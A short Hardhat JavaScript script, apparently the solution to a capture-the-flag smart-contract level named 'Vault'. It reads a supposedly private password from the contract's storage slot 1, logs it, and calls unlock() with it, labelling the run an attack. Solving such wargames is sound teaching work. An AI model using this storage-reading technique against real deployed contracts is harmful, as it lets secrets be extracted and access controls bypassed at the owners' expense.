const hre = require("hardhat");

async function main() {
  const password = await hre.web3.eth.getStorageAt("0x88315B66bdfE22f9a952555acd0380cD77AE4c53", 1);
  const stringPassword = await hre.web3.utils.hexToAscii(password);
  console.log(stringPassword, "stringPassword");
  const Vault = await hre.ethers.getContractAt("Vault", "0x88315B66bdfE22f9a952555acd0380cD77AE4c53");
  await Vault.unlock(password);
  console.log("Vault attack completed.");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
